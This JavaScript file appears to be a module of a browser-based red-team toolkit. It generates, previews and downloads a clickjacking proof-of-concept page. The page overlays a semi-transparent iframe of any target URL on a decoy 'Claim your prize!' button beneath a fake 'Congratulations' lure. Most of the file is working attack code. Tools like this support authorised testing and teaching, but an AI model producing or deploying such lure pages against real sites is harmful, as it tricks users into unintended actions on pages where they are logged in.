// ========================================
// CLICKJACKING POC GENERATOR
// Category: Red Team
// ========================================

(function() {
    'use strict';

    function render() {
        return `
            <div class="mb-4">
                <h4><i class="bi bi-bullseye"></i> Clickjacking PoC Generator</h4>
                <p class="text-secondary">Create a simple iframe-based PoC to demonstrate clickjacking</p>
            </div>
            
            <div class="card">
                <div class="card-body">
                    <div class="row g-3">
                        <div class="col-md-6">
                            <label for="clickjackUrl" class="form-label">Target URL</label>
                            <input type="url" id="clickjackUrl" class="form-control" placeholder="https://target.example.com">
                        </div>
                        <div class="col-md-6">
                            <label for="decoyText" class="form-label">Decoy Button/Text</label>
                            <input type="text" id="decoyText" class="form-control" placeholder="Claim your prize!">
                        </div>
                        <div class="col-md-4">
                            <label for="iframeOpacity" class="form-label">Iframe Opacity (0–1)</label>
                            <input type="number" step="0.1" min="0" max="1" id="iframeOpacity" class="form-control" value="0.5">
                        </div>
                        <div class="col-md-4">
                            <label for="iframeWidth" class="form-label">Iframe Width</label>
                            <input type="text" id="iframeWidth" class="form-control" value="500px">
                        </div>
                        <div class="col-md-4">
                            <label for="iframeHeight" class="form-label">Iframe Height</label>
                            <input type="text" id="iframeHeight" class="form-control" value="500px">
                        </div>
                    </div>
                    
                    <div class="mt-3 d-flex gap-2">
                        <button class="btn btn-primary" onclick="generateClickjackingPoc()">
                            <i class="bi bi-play-fill"></i> Generate & Preview
                        </button>
                    </div>
                </div>
            </div>

            <div id="clickjackResults" class="mt-3"></div>
        `;
    }

    function init() {
        window.generateClickjackingPoc = function() {
            const url = document.getElementById('clickjackUrl').value;
            const decoyText = document.getElementById('decoyText').value;
            const opacity = document.getElementById('iframeOpacity').value;
            const width = document.getElementById('iframeWidth').value;
            const height = document.getElementById('iframeHeight').value;
            const resultsDiv = document.getElementById('clickjackResults');
            
            if (!url) {
                resultsDiv.innerHTML = `<div class="alert alert-danger" role="alert">Enter a URL.</div>`;
                return;
            }

            const pocHtml = `<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            margin: 0;
        }
        .container {
            position: relative;
            width: ${width};
            height: ${height};
            margin: 0 auto;
            border: 2px dashed #ccc;
        }
        .decoy {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 1;
        }
        .decoy button {
            padding: 15px 30px;
            font-size: 18px;
            background: linear-gradient(135deg, #0d6efd, #0a58ca);
            color: #fff;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            transition: all 0.3s ease;
        }
        .decoy button:hover {
            background: linear-gradient(135deg, #0a58ca, #084298);
            transform: translateY(-2px);
            box-shadow: 0 6px 8px rgba(0,0,0,0.15);
        }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: ${opacity};
            z-index: 2;
            border: none;
        }
        .instructions {
            margin-top: 20px;
            color: #666;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <h2>🎉 Congratulations! 🎉</h2>
    <p>You've won a special prize! Click below to claim it.</p>
    
    <div class="container">
        <div class="decoy">
            <button>${decoyText}</button>
        </div>
        <iframe src="${url}"></iframe>
    </div>
    
    <div class="instructions">
        <p><strong>How it works:</strong> The transparent iframe overlays the target page. Users think they're clicking "${decoyText}" but actually interact with the hidden page.</p>
        <p>Adjust iframe opacity using the control above to see the overlay effect.</p>
    </div>
</body>
</html>`;

            // Create blob URL for the iframe
            const blob = new Blob([pocHtml], { type: 'text/html' });
            const blobUrl = URL.createObjectURL(blob);

            // Display results with live preview
            resultsDiv.innerHTML = `
                <div class="alert alert-success" role="alert">
                    <strong>PoC Preview Ready!</strong> The clickjacking demonstration is loaded below.
                </div>
                
                <div class="card">
                    <div class="card-header d-flex justify-content-between align-items-center">
                        <span>Live Preview</span>
                        <small class="text-muted">Users see the button but interact with the hidden page</small>
                    </div>
                    <div class="card-body p-0">
                        <iframe src="${blobUrl}" style="width: 100%; height: 600px; border: none;"></iframe>
                    </div>
                </div>

                <div class="card mt-3">
                    <div class="card-header">
                        HTML Source Code
                        <button class="btn btn-sm btn-outline-secondary float-end" onclick="copyClickjackingCode()">
                            <i class="bi bi-clipboard"></i> Copy Code
                        </button>
                    </div>
                    <div class="card-body">
                        <pre class="bg-dark text-light p-3 rounded small" style="max-height: 400px; overflow-y: auto;">${window.escapeHtml(pocHtml)}</pre>
                        <button class="btn btn-outline-primary" onclick="downloadClickjackingPoc()">
                            <i class="bi bi-download"></i> Download HTML File
                        </button>
                    </div>
                </div>
            `;

            // Store the blob URL and HTML for download/copy functions
            window.currentClickjackingData = {
                blobUrl: blobUrl,
                html: pocHtml
            };
        };

        // Add copy function
        window.copyClickjackingCode = function() {
            if (window.currentClickjackingData) {
                navigator.clipboard.writeText(window.currentClickjackingData.html).then(() => {
                    // Show temporary success message
                    const btn = event.target.closest('button');
                    const originalHtml = btn.innerHTML;
                    btn.innerHTML = '<i class="bi bi-check"></i> Copied!';
                    btn.classList.remove('btn-outline-secondary');
                    btn.classList.add('btn-success');
                    setTimeout(() => {
                        btn.innerHTML = originalHtml;
                        btn.classList.remove('btn-success');
                        btn.classList.add('btn-outline-secondary');
                    }, 2000);
                });
            }
        };

        // Add download function
        window.downloadClickjackingPoc = function() {
            if (window.currentClickjackingData) {
                const blob = new Blob([window.currentClickjackingData.html], { type: 'text/html' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'clickjacking-poc.html';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
            }
        };
    }

    window.registerCyberSuiteTool({
        id: 'clickjacking-poc',
        name: 'Clickjacking PoC Generator',
        description: 'Generate and preview proof-of-concept for clickjacking',
        icon: 'bi-bullseye',
        category: 'red',
        render: render,
        init: init
    });
})();